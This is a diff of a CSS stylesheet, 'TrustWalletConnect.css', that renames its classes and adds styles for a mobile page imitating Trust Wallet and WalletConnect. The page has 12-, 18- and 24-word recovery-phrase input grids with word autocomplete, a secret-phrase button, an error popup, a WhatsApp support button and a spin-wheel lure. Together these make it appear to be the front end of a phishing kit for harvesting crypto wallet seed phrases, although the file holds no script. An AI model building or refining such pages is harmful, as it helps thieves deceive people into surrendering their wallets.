@@ -1,4 +1,4 @@
-/* TrustWalletConnect.css - Mobile Optimized */
+/* TrustWalletConnect.css - Mobile Optimized with Unique Classnames */
 
 /* RESET - Mobile First */
 * {
@@ -19,12 +19,12 @@ body {
   overscroll-behavior: none;
 }
 
-.twc-page * {
+.twc-page-unique * {
   font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
 }
 
 /* PAGE - Mobile Optimized */
-.twc-page {
+.twc-page-unique {
   min-height: 100vh;
   min-height: -webkit-fill-available; /* For mobile Safari */
   background: #245aa6;
@@ -41,7 +41,7 @@ body {
 }
 
 /* Back Button */
-.twc-back-button {
+.twc-back-button-unique {
   position: absolute;
   top: 20px;
   left: 20px;
@@ -65,17 +65,17 @@ body {
   min-height: 44px; /* Minimum touch target */
 }
 
-.twc-back-button:hover {
+.twc-back-button-unique:hover {
   background: rgba(255, 255, 255, 0.3);
   transform: translateY(-1px);
 }
 
-.twc-back-button:active {
+.twc-back-button-unique:active {
   transform: translateY(0);
 }
 
 /* LOGO - Responsive */
-.twc-logo {
+.twc-logo-unique {
   width: 100%;
   display: flex;
   justify-content: center;
@@ -83,21 +83,22 @@ body {
   margin-top: 20px;
 }
 
-.twc-logo img {
+.twc-logo-unique img {
   height: 70px;
   max-width: 180px;
   object-fit: contain;
 }
 
-.twc-back{
+.twc-back-unique {
   color: black;
   position: absolute;
-    left: 20px;
-    font-size: 22px;
-    cursor: pointer;
+  left: 20px;
+  font-size: 22px;
+  cursor: pointer;
 }
+
 /* CARD - Mobile First */
-.twc-card {
+.twc-card-unique {
   background: #cfeefa;
   padding: 25px 20px;
   border-radius: 16px;
@@ -109,7 +110,7 @@ body {
 }
 
 /* HEADER - Mobile Responsive */
-.twc-header-main {
+.twc-header-main-unique {
   display: flex;
   flex-direction: row;
   align-items: center;
@@ -119,23 +120,26 @@ body {
   width: 100%;               /* ✅ ensures full-width centering */
 }
 
-.twc-connect-text {
-  font-size: 12px;
-  font-weight: 700;
+/* CONNECT WALLET text - Increased size */
+.twc-connect-text-unique {
+  font-size: 32px;
+  font-weight: 600;
   color: #137ae8;
   margin: 0;
   line-height: 1.2;
   white-space: nowrap;
+  letter-spacing: 1px;
+  text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
 }
 
-.twc-header-main img {
+.twc-header-main-unique img {
   width: 180px;
   height: auto;
   object-fit: contain;
 }
 
 /* INPUTS - Mobile Optimized */
-.twc-label-email {
+.twc-label-email-unique {
   color: #137ae8;
   margin-top: 20px;
   display: block;
@@ -144,7 +148,7 @@ body {
   margin-bottom: 8px;
 }
 
-.twc-input {
+.twc-input-unique {
   width: 100%;
   padding: 16px;
   border-radius: 8px;
@@ -158,28 +162,128 @@ body {
   min-height: 52px; /* Minimum touch target */
 }
 
-.twc-input:focus {
+.twc-input-unique:focus {
   border-color: #2f7dd3;
   box-shadow: 0 0 0 2px rgba(47, 125, 211, 0.2);
 }
 
-.twc-input::placeholder {
+.twc-input-unique::placeholder {
   color: #999;
   font-size: 14px;
 }
 
 /* PHRASE BOX - Mobile Responsive Grid */
-.twc-phrase-box {
+.twc-phrase-box-unique {
   background: #9ec7f3;
   padding: 20px;
   border-radius: 12px;
   display: grid;
-  grid-template-columns: repeat(2, 1fr); /* 2 columns for mobile */
   gap: 12px;
   margin-top: 10px;
 }
 
-.twc-word-input {
+/* Grid layouts for different word counts */
+.twc-grid-12-unique {
+  grid-template-columns: repeat(2, 1fr);
+}
+
+.twc-grid-18-unique {
+  grid-template-columns: repeat(3, 1fr);
+}
+
+.twc-grid-24-unique {
+  grid-template-columns: repeat(4, 1fr);
+}
+
+/* ================= UPDATED SUGGESTION UI ================= */
+.twc-suggestions-unique {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  right: 0;
+  background: white;
+  border: 1px solid #2f7dd3;
+  border-radius: 8px;
+  margin-top: 4px;
+  max-height: 200px;
+  overflow-y: auto;
+  z-index: 1000;
+  box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+  scrollbar-width: thin;
+  scrollbar-color: #2f7dd3 #e6f0fa;
+  animation: twc-suggestions-slide-unique 0.2s ease-out;
+}
+
+@keyframes twc-suggestions-slide-unique {
+  from {
+    opacity: 0;
+    transform: translateY(-10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+.twc-suggestions-unique::-webkit-scrollbar {
+  width: 6px;
+}
+
+.twc-suggestions-unique::-webkit-scrollbar-track {
+  background: #e6f0fa;
+  border-radius: 0 8px 8px 0;
+}
+
+.twc-suggestions-unique::-webkit-scrollbar-thumb {
+  background: #2f7dd3;
+  border-radius: 3px;
+}
+
+.twc-suggestions-unique::-webkit-scrollbar-thumb:hover {
+  background: #1e5ca3;
+}
+
+.twc-suggestion-item-unique {
+  padding: 12px 16px;
+  cursor: pointer;
+  font-size: 14px;
+  color: #333;
+  transition: all 0.15s ease;
+  border-bottom: 1px solid #eef2f6;
+  background: white;
+}
+
+.twc-suggestion-item-unique:last-child {
+  border-bottom: none;
+}
+
+.twc-suggestion-item-unique:hover,
+.twc-suggestion-active-unique {
+  background: #e3f0ff;
+  color: #2f7dd3;
+  padding-left: 20px;
+  font-weight: 500;
+  border-left: 3px solid #2f7dd3;
+}
+
+/* For small screens - make suggestions larger touch targets */
+@media (max-width: 480px) {
+  .twc-suggestion-item-unique {
+    padding: 14px 16px;
+    font-size: 16px;
+  }
+}
+
+/* For very small screens */
+@media (max-width: 360px) {
+  .twc-suggestion-item-unique {
+    padding: 16px 14px;
+    font-size: 15px;
+  }
+}
+
+/* Update the word input container for better suggestion positioning */
+.twc-word-input-unique {
   width: 100%;
   padding: 14px;
   border-radius: 6px;
@@ -187,24 +291,32 @@ body {
   background: white;
   font-size: 14px;
   outline: none;
-  transition: border-color 0.2s;
+  transition: all 0.2s ease;
   -webkit-appearance: none;
   appearance: none;
-  min-height: 48px; /* Minimum touch target */
+  min-height: 48px;
+  position: relative;
+  z-index: 1;
 }
 
-.twc-word-input:focus {
+.twc-word-input-unique:focus {
   border-color: #2f7dd3;
   box-shadow: 0 0 0 2px rgba(47, 125, 211, 0.2);
 }
 
-.twc-word-input::placeholder {
+/* Add a subtle indicator for fields with suggestions */
+.twc-word-input-unique[data-has-suggestions="true"] {
+  border-bottom-left-radius: 0;
+  border-bottom-right-radius: 0;
+}
+
+.twc-word-input-unique::placeholder {
   color: #999;
   font-size: 13px;
 }
 
 /* Info Scroller Wrapper */
-.twc-info-wrapper {
+.twc-info-wrapper-unique {
   width: 100%;
   overflow: hidden;
   background: rgba(255, 255, 255, 0.7);
@@ -214,18 +326,18 @@ body {
 }
 
 /* Scrolling Text */
-.twc-info-text-scroll {
+.twc-info-text-scroll-unique {
   display: inline-block;
   white-space: nowrap;
   font-size: 13px;
   color: #f00606;
   line-height: 1.5;
   padding: 10px 0;
-  animation: scrollLeft 15s linear infinite;
+  animation: twc-scroll-left-unique 15s linear infinite;
 }
 
 /* RIGHT ➜ LEFT animation */
-@keyframes scrollLeft {
+@keyframes twc-scroll-left-unique {
   0% {
     transform: translateX(100%);
   }
@@ -235,7 +347,7 @@ body {
 }
 
 /* BUTTON - Mobile Optimized */
-.twc-connect-btn {
+.twc-connect-btn-unique {
   width: 100%;
   margin-top: 25px;
   padding: 18px;
@@ -255,18 +367,42 @@ body {
   overflow: hidden;
 }
 
-.twc-connect-btn:active:not(:disabled) {
+.twc-connect-btn-unique:active:not(:disabled) {
   transform: scale(0.98);
 }
 
-.twc-connect-btn:disabled {
+.twc-connect-btn-unique:disabled {
   opacity: 0.6;
   cursor: not-allowed;
 }
 
+/* Secret Phrase Button */
+.twc-secret-phrase-btn-unique {
+  width: 100%;
+  margin-top: 15px;
+  padding: 16px;
+  border-radius: 30px;
+  border: 2px solid #2f7dd3;
+  background: transparent;
+  color: #2f7dd3;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  min-height: 56px;
+}
+
+.twc-secret-phrase-btn-unique:hover {
+  background: #2f7dd3;
+  color: white;
+}
+
+.twc-secret-phrase-btn-unique:active {
+  transform: scale(0.98);
+}
 
 /* POPUP MODAL - Mobile Optimized */
-.twc-modal-overlay {
+.twc-modal-overlay-unique {
   position: fixed !important;
   top: 0;
   left: 0;
@@ -286,40 +422,40 @@ body {
   -webkit-backdrop-filter: blur(5px);
 }
 
-.twc-modal-box {
+.twc-modal-box-unique {
   background: #ffffff;
   width: 100%;
   max-width: 400px;
   padding: 28px 24px;
   border-radius: 16px;
   text-align: center;
-  animation: modalIn 0.25s ease-out forwards;
+  animation: twc-modal-in-unique 0.25s ease-out forwards;
   box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
   border: 1px solid rgba(255, 255, 255, 0.1);
 }
 
 /* Close animation */
-.twc-modal-overlay.closing .twc-modal-box {
-  animation: modalOut 0.2s ease-in forwards;
+.twc-modal-overlay-unique.twc-closing-unique .twc-modal-box-unique {
+  animation: twc-modal-out-unique 0.2s ease-in forwards;
 }
 
 /* Content */
-.twc-popup-icon {
+.twc-popup-icon-unique {
   font-size: 48px;
   color: #ff4444;
   margin-bottom: 15px;
   line-height: 1;
 }
 
-.twc-popup-title {
+.twc-popup-title-unique {
   font-size: 24px;
   margin-bottom: 12px;
-  color:red;
+  color: red;
   font-weight: 700;
   line-height: 1.3;
 }
 
-.twc-popup-text {
+.twc-popup-text-unique {
   font-size: 15px;
   line-height: 1.5;
   color: black;
@@ -327,7 +463,7 @@ body {
   padding: 0 5px;
 }
 
-.twc-popup-btn {
+.twc-popup-btn-unique {
   margin-top: 25px;
   padding: 16px 32px;
   border-radius: 30px;
@@ -342,12 +478,12 @@ body {
   transition: all 0.3s ease;
 }
 
-.twc-popup-btn:active {
+.twc-popup-btn-unique:active {
   transform: scale(0.95);
 }
 
 /* Animations */
-@keyframes modalIn {
+@keyframes twc-modal-in-unique {
   from {
     transform: scale(0.9) translateY(20px);
     opacity: 0;
@@ -358,7 +494,7 @@ body {
   }
 }
 
-@keyframes modalOut {
+@keyframes twc-modal-out-unique {
   from {
     transform: scale(1) translateY(0);
     opacity: 1;
@@ -369,354 +505,8 @@ body {
   }
 }
 
-/* ============================================
-   ENHANCED RESPONSIVENESS FOR ALL MOBILE SIZES
-============================================ */
-
-/* Very Small Phones (iPhone SE, Galaxy Fold, etc.) */
-@media (max-width: 360px) {
-  .twc-page {
-    padding: 15px;
-  }
-  
-  .twc-back-button {
-    top: 15px;
-    left: 15px;
-    padding: 8px 12px;
-    font-size: 13px;
-  }
-  
-  .twc-card {
-    padding: 20px 15px;
-    border-radius: 14px;
-  }
-  
-  .twc-logo img {
-    height: 60px;
-  }
-  
-  .twc-connect-text {
-    font-size: 10px;
-  }
-  
-  .twc-header-main img {
-    width: 160px;
-  }
-  
-  .twc-phrase-box {
-    grid-template-columns: repeat(2, 1fr);
-    gap: 10px;
-    padding: 15px;
-  }
-  
-  .twc-word-input {
-    padding: 12px;
-    font-size: 13px;
-  }
-  
-  .twc-connect-btn {
-    padding: 16px;
-    font-size: 16px;
-    min-height: 56px;
-  }
-  
-  .twc-modal-box {
-    padding: 24px 20px;
-  }
-  
-  .twc-popup-title {
-    font-size: 22px;
-  }
-  
-  .twc-popup-text {
-    font-size: 14px;
-  }
-}
-
-/* Small Phones (iPhone 12/13/14, Galaxy S series) */
-@media (min-width: 361px) and (max-width: 400px) {
-  .twc-phrase-box {
-    grid-template-columns: repeat(2, 1fr);
-  }
-}
-
-/* Medium Phones (Larger Android phones) */
-@media (min-width: 401px) and (max-width: 480px) {
-  .twc-phrase-box {
-    grid-template-columns: repeat(3, 1fr);
-  }
-  
-  .twc-card {
-    padding: 30px 25px;
-  }
-}
-
-/* Small Tablets (iPad Mini, etc.) */
-@media (min-width: 481px) and (max-width: 768px) {
-  .twc-page {
-    justify-content: center;
-    padding: 30px;
-  }
-  
-  .twc-back-button {
-    top: 30px;
-    left: 30px;
-  }
-  
-  .twc-card {
-    max-width: 600px;
-    padding: 35px 30px;
-  }
-  
-  .twc-phrase-box {
-    grid-template-columns: repeat(3, 1fr);
-    gap: 15px;
-    padding: 25px;
-  }
-  
-  .twc-word-input {
-    padding: 16px;
-    font-size: 15px;
-  }
-  
-  .twc-connect-text {
-    font-size: 32px;
-  }
-  
-  .twc-header-main img {
-    width: 200px;
-  }
-  
-  .twc-modal-box {
-    max-width: 450px;
-    padding: 32px 28px;
-  }
-}
-
-/* Tablets (iPad, etc.) */
-@media (min-width: 769px) and (max-width: 1024px) {
-  .twc-page {
-    padding: 40px;
-  }
-  
-  .twc-back-button {
-    top: 40px;
-    left: 40px;
-    padding: 12px 20px;
-    font-size: 15px;
-  }
-  
-  .twc-card {
-    max-width: 700px;
-    padding: 40px;
-  }
-  
-  .twc-phrase-box {
-    grid-template-columns: repeat(4, 1fr);
-    padding: 30px;
-  }
-  
-  .twc-header-main {
-    flex-direction: row;
-    justify-content: center;
-    gap: 20px;
-  }
-  
-  .twc-connect-text {
-    font-size: 12px;
-  }
-  
-  .twc-header-main img {
-    width: 220px;
-  }
-}
-
-/* DESKTOP - Fit in single frame */
-@media (min-width: 1025px) {
-  .twc-page {
-    justify-content: center;
-    padding: 40px;
-    min-height: 100vh;
-    max-width: 1200px;
-    margin: 0 auto;
-  }
-  
-  .twc-back-button {
-    top: 40px;
-    left: 40px;
-  }
-  
-  .twc-card {
-    max-width: 500px;
-    width: 100%;
-    padding: 40px 35px;
-  }
-  
-  .twc-phrase-box {
-    grid-template-columns: repeat(3, 1fr);
-    gap: 15px;
-    padding: 25px;
-  }
-  
-  .twc-logo img {
-    height: 80px;
-    max-width: 200px;
-  }
-  
-  .twc-connect-text {
-    font-size: 12px; /* Changed from 32px to 12px for desktop */
-  }
-  
-  .twc-header-main img {
-    width: 200px;
-  }
-  
-  .twc-modal-box {
-    max-width: 450px;
-  }
-}
-
-/* Landscape Mode Optimization */
-@media (max-height: 500px) and (orientation: landscape) {
-  .twc-page {
-    padding-top: 15px;
-    padding-bottom: 15px;
-    min-height: auto;
-  }
-  
-  .twc-back-button {
-    top: 10px;
-    left: 10px;
-    padding: 6px 10px;
-    font-size: 13px;
-  }
-  
-  .twc-logo {
-    margin-bottom: 10px;
-  }
-  
-  .twc-logo img {
-    height: 50px;
-  }
-  
-  .twc-card {
-    padding: 20px;
-  }
-  
-  .twc-phrase-box {
-    padding: 15px;
-    max-height: 150px;
-    overflow-y: auto;
-  }
-  
-  .twc-word-input {
-    padding: 10px;
-    min-height: 40px;
-  }
-  
-  .twc-connect-btn {
-    margin-top: 15px;
-    padding: 12px;
-    min-height: 50px;
-  }
-  
-  .twc-modal-overlay {
-    align-items: flex-start;
-    padding-top: 20px;
-  }
-  
-  .twc-modal-box {
-    margin-top: 20px;
-  }
-}
-
-/* Prevent iOS zoom on input focus */
-@media screen and (max-width: 768px) {
-  .twc-input,
-  .twc-word-input {
-    font-size: 16px !important;
-  }
-}
-
-/* High-DPI Screens */
-@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
-  .twc-card {
-    border: 1px solid rgba(255, 255, 255, 0.1);
-  }
-  
-  .twc-word-input,
-  .twc-input {
-    border-width: 1.5px;
-  }
-}
-
-/* Dark Mode Support */
-@media (prefers-color-scheme: dark) {
-  .twc-word-input::placeholder,
-  .twc-input::placeholder {
-    color:black;
-  }
-  
-  .twc-label-email {
-    color: #63b3ed;
-  }
-  
-  .twc-popup-text {
-    color: black;
-  }
-  
-  .twc-popup-title {
-    color:red;
-  }
-  
-  .twc-back-button {
-    background: rgba(255, 255, 255, 0.1);
-    color: #e2e8f0;
-    border-color: rgba(255, 255, 255, 0.05);
-  }
-}
-
-/* Reduced Motion Support */
-@media (prefers-reduced-motion: reduce) {
-  .twc-modal-box,
-  .twc-modal-overlay.closing .twc-modal-box,
-  .twc-connect-btn,
-  .twc-popup-btn,
-  .twc-back-button {
-    animation: none !important;
-    transition: none !important;
-  }
-}
-
-/* Accessibility Improvements */
-.twc-input:focus-visible,
-.twc-word-input:focus-visible,
-.twc-connect-btn:focus-visible,
-.twc-popup-btn:focus-visible,
-.twc-back-button:focus-visible {
-  outline: 3px solid #137ae8;
-  outline-offset: 2px;
-}
-
-/* Loading State for Button */
-/* .twc-connect-btn:disabled::after {
-  content: '';
-  width: 16px;
-  height: 16px;
-  border: 2px solid rgba(255, 255, 255, 0.3);
-  border-top-color: white;
-  border-radius: 50%;
-  animation: buttonSpinner 0.8s linear infinite;
-  margin-left: 10px;
-} */
-
-@keyframes buttonSpinner {
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-.twc-header-container {
+/* Header Container */
+.twc-header-container-unique {
   display: flex;
   flex-direction: column;
   align-items: center;
@@ -726,68 +516,569 @@ body {
 }
 
 /* WalletConnect logo (top) */
-.twc-walletconnect-img {
+.twc-walletconnect-img-unique {
   height: 80px;
   width: auto;
   object-fit: contain;
 }
 
 /* CONNECT + Trust Wallet row */
-.twc-header-row {
+.twc-header-row-unique {
   display: flex;
   align-items: center;
   justify-content: center;
   gap: 0px;
 }
 
-.twc-header-row img {
+.twc-header-row-unique img {
   height: 36px;
   width: auto;
   object-fit: contain;
 }
 
-.twc-connect-text {
+.twc-connect-text-unique {
   white-space: nowrap;
 }
+
 /* Animated Error Icon */
-.twc-error-icon {
+.twc-error-icon-unique {
   width: 64px;
   height: 64px;
 }
 
-.twc-error-circle {
+.twc-error-circle-unique {
   stroke: #ff4444;
   stroke-width: 3;
   stroke-dasharray: 157;
   stroke-dashoffset: 157;
-  animation: drawCircle 0.6s ease-out forwards;
+  animation: twc-draw-circle-unique 0.6s ease-out forwards;
 }
 
-.twc-error-line {
+.twc-error-line-unique {
   stroke: #ff4444;
   stroke-width: 3;
   stroke-linecap: round;
   stroke-dasharray: 40;
   stroke-dashoffset: 40;
-  animation: drawLine 0.3s ease-out forwards;
+  animation: twc-draw-line-unique 0.3s ease-out forwards;
 }
 
-.twc-error-line-left {
+.twc-error-line-left-unique {
   animation-delay: 0.6s;
 }
 
-.twc-error-line-right {
+.twc-error-line-right-unique {
   animation-delay: 0.75s;
 }
 
-@keyframes drawCircle {
+@keyframes twc-draw-circle-unique {
   to {
     stroke-dashoffset: 0;
   }
 }
 
-@keyframes drawLine {
+@keyframes twc-draw-line-unique {
   to {
     stroke-dashoffset: 0;
   }
+}
+
+@keyframes twc-button-spinner-unique {
+  to {
+    transform: rotate(360deg);
+  }
+}
+
+/* ============================================
+   ENHANCED RESPONSIVENESS FOR ALL MOBILE SIZES
+============================================ */
+
+/* Very Small Phones (iPhone SE, Galaxy Fold, etc.) */
+@media (max-width: 360px) {
+  .twc-page-unique {
+    padding: 15px;
+  }
+  
+  .twc-back-button-unique {
+    top: 15px;
+    left: 15px;
+    padding: 8px 12px;
+    font-size: 13px;
+  }
+  
+  .twc-card-unique {
+    padding: 20px 15px;
+    border-radius: 14px;
+  }
+  
+  .twc-logo-unique img {
+    height: 60px;
+  }
+  
+  .twc-connect-text-unique {
+    font-size: 24px;
+  }
+  
+  .twc-header-main-unique img {
+    width: 160px;
+  }
+  
+  .twc-phrase-box-unique {
+    gap: 10px;
+    padding: 15px;
+  }
+  
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-word-input-unique {
+    padding: 12px;
+    font-size: 13px;
+  }
+  
+  .twc-connect-btn-unique {
+    padding: 16px;
+    font-size: 16px;
+    min-height: 56px;
+  }
+  
+  .twc-secret-phrase-btn-unique {
+    padding: 14px;
+    font-size: 15px;
+    min-height: 52px;
+  }
+  
+  .twc-modal-box-unique {
+    padding: 24px 20px;
+  }
+  
+  .twc-popup-title-unique {
+    font-size: 22px;
+  }
+  
+  .twc-popup-text-unique {
+    font-size: 14px;
+  }
+  
+  .twc-suggestion-item-unique {
+    padding: 16px 14px;
+    font-size: 15px;
+  }
+}
+
+/* Small Phones (iPhone 12/13/14, Galaxy S series) */
+@media (min-width: 361px) and (max-width: 400px) {
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-suggestion-item-unique {
+    padding: 14px 16px;
+    font-size: 16px;
+  }
+}
+
+/* Medium Phones (Larger Android phones) */
+@media (min-width: 401px) and (max-width: 480px) {
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(4, 1fr);
+  }
+  
+  .twc-card-unique {
+    padding: 30px 25px;
+  }
+  
+  .twc-suggestion-item-unique {
+    padding: 14px 16px;
+    font-size: 16px;
+  }
+}
+
+/* Small Tablets (iPad Mini, etc.) */
+@media (min-width: 481px) and (max-width: 768px) {
+  .twc-page-unique {
+    justify-content: center;
+    padding: 30px;
+  }
+  
+  .twc-back-button-unique {
+    top: 30px;
+    left: 30px;
+  }
+  
+  .twc-card-unique {
+    max-width: 600px;
+    padding: 35px 30px;
+  }
+  
+  .twc-phrase-box-unique {
+    gap: 15px;
+    padding: 25px;
+  }
+  
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(4, 1fr);
+  }
+  
+  .twc-word-input-unique {
+    padding: 16px;
+    font-size: 15px;
+  }
+  
+  .twc-connect-text-unique {
+    font-size: 42px;
+  }
+  
+  .twc-header-main-unique img {
+    width: 200px;
+  }
+  
+  .twc-modal-box-unique {
+    max-width: 450px;
+    padding: 32px 28px;
+  }
+}
+
+/* Tablets (iPad, etc.) */
+@media (min-width: 769px) and (max-width: 1024px) {
+  .twc-page-unique {
+    padding: 40px;
+  }
+  
+  .twc-back-button-unique {
+    top: 40px;
+    left: 40px;
+    padding: 12px 20px;
+    font-size: 15px;
+  }
+  
+  .twc-card-unique {
+    max-width: 700px;
+    padding: 40px;
+  }
+  
+  .twc-phrase-box-unique {
+    padding: 30px;
+  }
+  
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(4, 1fr);
+  }
+  
+  .twc-header-main-unique {
+    flex-direction: row;
+    justify-content: center;
+    gap: 20px;
+  }
+  
+  .twc-connect-text-unique {
+    font-size: 36px;
+  }
+  
+  .twc-header-main-unique img {
+    width: 220px;
+  }
+}
+
+/* DESKTOP - Fit in single frame */
+@media (min-width: 1025px) {
+  .twc-page-unique {
+    justify-content: center;
+    padding: 40px;
+    min-height: 100vh;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  
+  .twc-back-button-unique {
+    top: 40px;
+    left: 40px;
+  }
+  
+  .twc-card-unique {
+    max-width: 500px;
+    width: 100%;
+    padding: 40px 35px;
+  }
+  
+  .twc-phrase-box-unique {
+    gap: 15px;
+    padding: 25px;
+  }
+  
+  .twc-grid-12-unique {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .twc-grid-18-unique {
+    grid-template-columns: repeat(3, 1fr);
+  }
+  
+  .twc-grid-24-unique {
+    grid-template-columns: repeat(4, 1fr);
+  }
+  
+  .twc-logo-unique img {
+    height: 80px;
+    max-width: 200px;
+  }
+  
+  .twc-connect-text-unique {
+    font-size: 36px;
+  }
+  
+  .twc-header-main-unique img {
+    width: 200px;
+  }
+  
+  .twc-modal-box-unique {
+    max-width: 450px;
+  }
+}
+
+/* Landscape Mode Optimization */
+@media (max-height: 500px) and (orientation: landscape) {
+  .twc-page-unique {
+    padding-top: 15px;
+    padding-bottom: 15px;
+    min-height: auto;
+  }
+  
+  .twc-back-button-unique {
+    top: 10px;
+    left: 10px;
+    padding: 6px 10px;
+    font-size: 13px;
+  }
+  
+  .twc-logo-unique {
+    margin-bottom: 10px;
+  }
+  
+  .twc-logo-unique img {
+    height: 50px;
+  }
+  
+  .twc-card-unique {
+    padding: 20px;
+  }
+  
+  .twc-phrase-box-unique {
+    padding: 15px;
+    max-height: 150px;
+    overflow-y: auto;
+  }
+  
+  .twc-word-input-unique {
+    padding: 10px;
+    min-height: 40px;
+  }
+  
+  .twc-connect-btn-unique {
+    margin-top: 15px;
+    padding: 12px;
+    min-height: 50px;
+  }
+  
+  .twc-modal-overlay-unique {
+    align-items: flex-start;
+    padding-top: 20px;
+  }
+  
+  .twc-modal-box-unique {
+    margin-top: 20px;
+  }
+}
+
+/* Prevent iOS zoom on input focus */
+@media screen and (max-width: 768px) {
+  .twc-input-unique,
+  .twc-word-input-unique {
+    font-size: 16px !important;
+  }
+}
+
+/* High-DPI Screens */
+@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+  .twc-card-unique {
+    border: 1px solid rgba(255, 255, 255, 0.1);
+  }
+  
+  .twc-word-input-unique,
+  .twc-input-unique {
+    border-width: 1.5px;
+  }
+}
+
+/* Dark Mode Support */
+@media (prefers-color-scheme: dark) {
+  .twc-word-input-unique::placeholder,
+  .twc-input-unique::placeholder {
+    color: black;
+  }
+  
+  .twc-label-email-unique {
+    color: #63b3ed;
+  }
+  
+  .twc-popup-text-unique {
+    color: black;
+  }
+  
+  .twc-popup-title-unique {
+    color: red;
+  }
+  
+  .twc-back-button-unique {
+    background: rgba(255, 255, 255, 0.1);
+    color: #e2e8f0;
+    border-color: rgba(255, 255, 255, 0.05);
+  }
+}
+
+/* Reduced Motion Support */
+@media (prefers-reduced-motion: reduce) {
+  .twc-modal-box-unique,
+  .twc-modal-overlay-unique.twc-closing-unique .twc-modal-box-unique,
+  .twc-connect-btn-unique,
+  .twc-popup-btn-unique,
+  .twc-back-button-unique,
+  .twc-secret-phrase-btn-unique,
+  .twc-info-text-scroll-unique,
+  .twc-suggestions-unique,
+  .twc-suggestion-item-unique {
+    animation: none !important;
+    transition: none !important;
+  }
+}
+
+/* Accessibility Improvements */
+.twc-input-unique:focus-visible,
+.twc-word-input-unique:focus-visible,
+.twc-connect-btn-unique:focus-visible,
+.twc-popup-btn-unique:focus-visible,
+.twc-back-button-unique:focus-visible,
+.twc-secret-phrase-btn-unique:focus-visible {
+  outline: 3px solid #137ae8;
+  outline-offset: 2px;
+}
+
+/* WhatsApp Float Button Styles */
+.twc-whatsapp-float-unique {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 54px;
+  height: 54px;
+  border-radius: 50%;
+  background-color: #25d366;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+  z-index: 10000;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  text-decoration: none;
+}
+
+.twc-whatsapp-float-unique:hover {
+  transform: scale(1.1);
+  box-shadow: 0 6px 25px rgba(37, 211, 102, 0.4);
+}
+
+.twc-pulse-unique {
+  animation: twc-whatsapp-pulse-unique 2s infinite;
+}
+
+@keyframes twc-whatsapp-pulse-unique {
+  0% {
+    box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7);
+  }
+  70% {
+    box-shadow: 0 0 0 15px rgba(37, 211, 102, 0);
+  }
+  100% {
+    box-shadow: 0 0 0 0 rgba(37, 211, 102, 0);
+  }
+}
+
+/* Spin Wheel Button Styles */
+.twc-spin-wheel-float-unique {
+  position: fixed;
+  bottom: 100px;
+  right: 30px;
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  background: radial-gradient(circle at 30% 30%, #f7931a, #c8930a);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4);
+  z-index: 10000;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  border: 3px solid rgba(255, 215, 0, 0.6);
+  overflow: hidden;
+  padding: 0;
+}
+
+.twc-spin-wheel-float-unique:hover {
+  transform: scale(1.15) rotate(10deg);
+  background: radial-gradient(circle at 30% 30%, #ffd700, #f7931a);
+  box-shadow: 0 10px 40px rgba(247, 147, 26, 0.8), 0 0 35px rgba(255, 215, 0, 0.7);
+}
+
+.twc-spin-wheel-float-unique:hover .twc-wheel-icon-image-unique {
+  transform: scale(1.2) rotate(15deg);
+}
+
+.twc-wheel-icon-image-unique {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  border-radius: 50%;
+  transition: transform 0.3s ease;
 }
